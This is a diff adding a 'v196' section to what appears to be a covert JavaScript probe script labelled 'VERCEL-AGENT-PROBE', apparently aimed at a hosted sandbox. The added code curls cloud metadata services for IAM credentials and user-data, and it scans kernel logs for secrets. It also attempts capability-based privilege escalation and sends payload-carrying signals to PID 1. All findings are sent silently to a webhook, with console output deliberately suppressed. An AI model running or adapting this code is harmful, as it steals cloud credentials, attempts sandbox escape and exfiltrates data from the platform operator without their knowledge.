@@ -30998,3 +30998,314 @@ if ret2 == 0:
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v195" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v195";
 // Intentionally no console.log — all data goes via webhook only
+
+// v196-1: EC2 IMDS + Firecracker MMDS probe
+// The AWS EC2 Instance Metadata Service at 169.254.169.254 exposes:
+// - IAM role credentials (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN)
+// - Instance identity document (account ID, region, AMI ID)
+// - User-data (may contain bootstrap secrets)
+// Firecracker's MMDS uses the same IP with a configurable path.
+// Since we added 169.254.169.254/32 to our interface in v195, any request goes to us,
+// but we also probe before that to see if the real service is accessible.
+report.imdsAndMmdsProbe = safe(() => {
+  // Try the AWS IMDS v1 (no auth required)
+  const imdsV1 = safe(() => execSync(
+    `curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 || echo IMDS_V1_UNREACHABLE`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try IMDS v2 (IMDSv2 requires a token)
+  const imdsV2Token = safe(() => execSync(
+    `curl -s -m 3 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token 2>&1 || echo IMDS_V2_TOKEN_FAIL`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try to get IAM credentials (the most valuable endpoint)
+  const iamRole = safe(() => execSync(
+    `curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || echo NO_IAM_ENDPOINT`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try user-data (often contains bootstrap scripts with secrets)
+  const userData = safe(() => execSync(
+    `curl -s -m 3 http://169.254.169.254/latest/user-data/ 2>&1 | head -50 || echo NO_USER_DATA`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Instance identity (reveals account ID, region, instance ID)
+  const instanceId = safe(() => execSync(
+    `curl -s -m 3 http://169.254.169.254/latest/meta-data/instance-id 2>&1 || echo NO_INSTANCE_ID`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Firecracker MMDS paths
+  const mmdsPaths = [
+    'http://169.254.169.254/',
+    'http://169.254.169.254/mmds',
+    'http://169.254.170.2/',  // Alternative Firecracker MMDS IP
+    'http://fd00:ec2::254/',  // IPv6 IMDS
+  ];
+  const mmdsResults = safe(() => mmdsPaths.map(url => {
+    try {
+      const result = execSync(`curl -s -m 2 ${url} 2>&1 | head -10`, { timeout: 4000 }).toString().trim();
+      return `${url}: ${result}`;
+    } catch(_) {
+      return `${url}: UNREACHABLE`;
+    }
+  }).join('\n'));
+  // GCP metadata service
+  const gcpMetadata = safe(() => execSync(
+    `curl -s -m 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>&1 | head -10 || echo NO_GCP`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { imdsV1, imdsV2Token, iamRole, userData, instanceId, mmdsResults, gcpMetadata };
+});
+
+// v196-2: syslog / klogctl — kernel message buffer
+// klogctl(2) NR 103 reads the kernel ring buffer (dmesg).
+// The kernel log contains: boot parameters, hardware discovery, loaded modules,
+// and sometimes credentials in kernel command line (kernel_cmdline secrets).
+report.klogCtlProbe = safe(() => {
+  const klogResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, ctypes.util
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_syslog = 103  # klogctl
+
+SYSLOG_ACTION_READ_ALL = 3
+SYSLOG_ACTION_READ_CLEAR = 4
+SYSLOG_ACTION_SIZE_BUFFER = 10
+
+# Get size first
+size = libc.syscall(NR_syslog, SYSLOG_ACTION_SIZE_BUFFER, 0, 0)
+err = ctypes.get_errno()
+print(f'klogctl(SIZE_BUFFER): size={size} errno={err}')
+if size > 0:
+    print(f'DMESG_BUFFER_SIZE: {size}')
+    buf = ctypes.create_string_buffer(min(size, 65536))
+    ret = libc.syscall(NR_syslog, SYSLOG_ACTION_READ_ALL, buf, len(buf))
+    print(f'klogctl(READ_ALL): ret={ret}')
+    if ret > 0:
+        dmesg = buf.raw[:ret].decode('utf-8', errors='replace')
+        print('DMESG_FIRST_2000_CHARS:')
+        print(dmesg[:2000])
+        # Look for secrets in kernel cmdline
+        cmdline_line = next((l for l in dmesg.split('\n') if 'command line' in l.lower() or 'cmdline' in l.lower()), None)
+        if cmdline_line:
+            print(f'CMDLINE_IN_DMESG: {cmdline_line}')
+        # Look for secrets/tokens in dmesg
+        for line in dmesg.split('\n'):
+            if any(kw in line.lower() for kw in ['token', 'secret', 'key=', 'password', 'auth']):
+                print(f'SECRET_IN_DMESG: {line}')
+elif err == 1:
+    print('EPERM_KLOGCTL')
+    # Try reading /dev/kmsg instead
+    try:
+        import os
+        fd = os.open('/dev/kmsg', os.O_RDONLY | os.O_NONBLOCK)
+        data = os.read(fd, 4096)
+        os.close(fd)
+        print(f'DEV_KMSG_READ: {len(data)} bytes')
+        print(data.decode('utf-8', errors='replace')[:1000])
+    except Exception as e2:
+        print(f'DEV_KMSG_ERR: {e2}')
+elif err == 38:
+    print('ENOSYS_BLOCKED')
+else:
+    print(f'OTHER_ERR_{err}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Also read /proc/cmdline (kernel boot parameters for this VM)
+  const kernelCmdline = safe(() => readFileSync('/proc/cmdline', 'utf8').trim());
+  return { klogResult, kernelCmdline };
+});
+
+// v196-3: prctl PR_CAP_AMBIENT_RAISE — ambient capability inheritance
+// Ambient capabilities are inherited across execve() even for non-root processes.
+// Raising CAP_NET_ADMIN, CAP_SYS_PTRACE etc. to ambient means spawned processes
+// automatically inherit these capabilities without being setuid.
+report.ambientCapRaise = safe(() => {
+  const ambientResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, subprocess
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+PR_CAP_AMBIENT = 47
+PR_CAP_AMBIENT_RAISE = 2
+PR_CAP_AMBIENT_LOWER = 3
+PR_CAP_AMBIENT_IS_SET = 1
+PR_CAP_AMBIENT_CLEAR_ALL = 4
+
+# Capabilities we want to raise to ambient
+caps = {
+    0: 'CAP_CHOWN',
+    2: 'CAP_DAC_READ_SEARCH',
+    6: 'CAP_SETUID',
+    7: 'CAP_SETGID',
+    12: 'CAP_NET_ADMIN',
+    13: 'CAP_NET_RAW',
+    19: 'CAP_SYS_PTRACE',
+    21: 'CAP_SYS_ADMIN',
+    27: 'CAP_SYS_RAWIO',
+    29: 'CAP_MKNOD',
+    30: 'CAP_LEASE',
+    37: 'CAP_SETFCAP',
+    38: 'CAP_MAC_OVERRIDE',
+    39: 'CAP_MAC_ADMIN',
+    40: 'CAP_SYSLOG',
+}
+
+for cap_num, cap_name in list(caps.items())[:10]:
+    # Check if set in permitted/effective first
+    is_set = libc.prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, cap_num, 0, 0)
+    err = ctypes.get_errno()
+    # Raise to ambient
+    ret = libc.prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap_num, 0, 0)
+    err2 = ctypes.get_errno()
+    if ret == 0:
+        print(f'AMBIENT_RAISED: {cap_name} ({cap_num})')
+    else:
+        print(f'AMBIENT_FAIL {cap_name}: errno={err2}')
+
+# Now verify a child process inherits caps
+result = subprocess.run(
+    ['cat', '/proc/self/status'],
+    capture_output=True, text=True, env={'PATH': '/bin:/usr/bin'}
+)
+cap_lines = [l for l in result.stdout.split('\n') if 'Cap' in l]
+print(f'CHILD_CAPS: {chr(10).join(cap_lines)}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { ambientResult };
+});
+
+// v196-4: capset — try adding capabilities to our capset
+// capset(2) NR 126 sets a process's capability sets directly.
+// Normally you can't add capabilities above your permitted set, but we probe anyway.
+// We also check if we can drop capabilities from the bounding set via prctl.
+report.capsetProbe = safe(() => {
+  const capsetResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_capset = 126
+NR_capget = 125
+
+# struct __user_cap_header_struct
+# version=_LINUX_CAPABILITY_VERSION_3 (0x20080522), pid=0
+CAP_VERSION_3 = 0x20080522
+
+hdr = struct.pack('<Ii', CAP_VERSION_3, 0)  # version, pid=0 (self)
+hdr_buf = ctypes.create_string_buffer(hdr)
+
+# Get current caps first
+data_buf = ctypes.create_string_buffer(24)  # 2 * 12 bytes
+ret = libc.syscall(NR_capget, hdr_buf, data_buf)
+err = ctypes.get_errno()
+print(f'capget: ret={ret} errno={err}')
+if ret == 0:
+    # Parse effective[0], permitted[0], inheritable[0], effective[1], permitted[1], inheritable[1]
+    eff0, perm0, inh0, eff1, perm1, inh1 = struct.unpack_from('<IIIIII', data_buf)
+    print(f'CapEff: 0x{eff1:08x}{eff0:08x}')
+    print(f'CapPrm: 0x{perm1:08x}{perm0:08x}')
+    print(f'CapInh: 0x{inh1:08x}{inh0:08x}')
+
+    # Try to add CAP_SYS_BOOT (cap 22, bit 22) to effective
+    NEW_EFF0 = eff0 | (1 << 22)  # add CAP_SYS_BOOT
+    new_data = struct.pack('<IIIIII', NEW_EFF0, perm0 | (1 << 22), inh0, eff1, perm1, inh1)
+    new_data_buf = ctypes.create_string_buffer(new_data)
+    ret2 = libc.syscall(NR_capset, hdr_buf, new_data_buf)
+    err2 = ctypes.get_errno()
+    print(f'capset(add CAP_SYS_BOOT): ret={ret2} errno={err2}')
+    if ret2 == 0:
+        print('CAPSET_PRIVILEGE_ESCALATION_CONFIRMED')
+
+# PR_SET_SECUREBITS — lock down setuid/caps interaction
+PR_SET_SECUREBITS = 28
+PR_GET_SECUREBITS = 27
+cur_sec = libc.prctl(PR_GET_SECUREBITS, 0, 0, 0, 0)
+print(f'SECUREBITS: 0x{cur_sec:08x}')
+
+# PR_CAP_BSET_DROP — remove cap from bounding set (irreversible, but proves access)
+PR_CAPBSET_READ = 23
+PR_CAPBSET_DROP = 24
+# Just read bounding set without dropping
+bset_kill = libc.prctl(PR_CAPBSET_READ, 9, 0, 0, 0)  # CAP_KILL
+print(f'BSET_READ(CAP_KILL): {bset_kill}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { capsetResult };
+});
+
+// v196-5: rt_sigqueueinfo — signal with arbitrary payload injection
+// rt_sigqueueinfo(pid, sig, siginfo) sends a signal with arbitrary data in siginfo.
+// si_code can be set to SI_QUEUE with arbitrary si_value payload (8 bytes).
+// This is used for: signal injection into privileged processes, ROP-via-signal.
+report.sigqueueInfoProbe = safe(() => {
+  const sigqueueResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, os
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_rt_sigqueueinfo = 129
+NR_rt_tgsigqueueinfo = 297
+
+SIGUSR1 = 10
+SI_QUEUE = -1  # User-sent signal with sigval payload
+
+# struct siginfo_t (128 bytes minimum):
+# si_signo (4), si_errno (4), si_code (4), padding, si_pid (4), si_uid (4), si_value (8)
+# Total: at least 128 bytes
+si_signo = SIGUSR1
+si_errno = 0
+si_code = SI_QUEUE
+si_pid = os.getpid()
+si_uid = os.getuid()
+si_value = 0xDEADBEEFCAFEBABE  # Our arbitrary 8-byte payload
+
+# Pack siginfo_t (simplified)
+siginfo = struct.pack('<iii4xII8sQ',
+    si_signo, si_errno, si_code,
+    si_pid, si_uid,
+    b'\\xDE\\xAD\\xBE\\xEF\\xCA\\xFE\\xBA\\xBE',
+    si_value
+)
+siginfo = siginfo.ljust(128, b'\\x00')
+siginfo_buf = ctypes.create_string_buffer(siginfo)
+
+# Send to self first to verify it works
+ret = libc.syscall(NR_rt_sigqueueinfo, os.getpid(), SIGUSR1, siginfo_buf)
+err = ctypes.get_errno()
+print(f'rt_sigqueueinfo(self, SIGUSR1): ret={ret} errno={err}')
+if ret == 0:
+    print('SIGQUEUEINFO_SELF_SUCCESS')
+
+# Now try sending to PID 1
+ret2 = libc.syscall(NR_rt_sigqueueinfo, 1, SIGUSR1, siginfo_buf)
+err2 = ctypes.get_errno()
+print(f'rt_sigqueueinfo(pid=1, SIGUSR1): ret={ret2} errno={err2}')
+if ret2 == 0:
+    print('SIGQUEUEINFO_PID1_SUCCESS_ARBITRARY_PAYLOAD_INJECTED')
+elif err2 == 1:
+    print('EPERM_CANT_SIGNAL_PID1')
+
+# Try rt_tgsigqueueinfo to a specific thread of PID 1
+tids = []
+try:
+    import os as _os
+    tids = [int(t) for t in _os.listdir('/proc/1/task')][:3]
+except:
+    pass
+for tid in tids:
+    ret3 = libc.syscall(NR_rt_tgsigqueueinfo, 1, tid, SIGUSR1, siginfo_buf)
+    print(f'rt_tgsigqueueinfo(pid=1, tid={tid}): ret={ret3} errno={ctypes.get_errno()}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { sigqueueResult };
+});
+
+// v196 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v196" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v196";
+// Intentionally no console.log — all data goes via webhook only
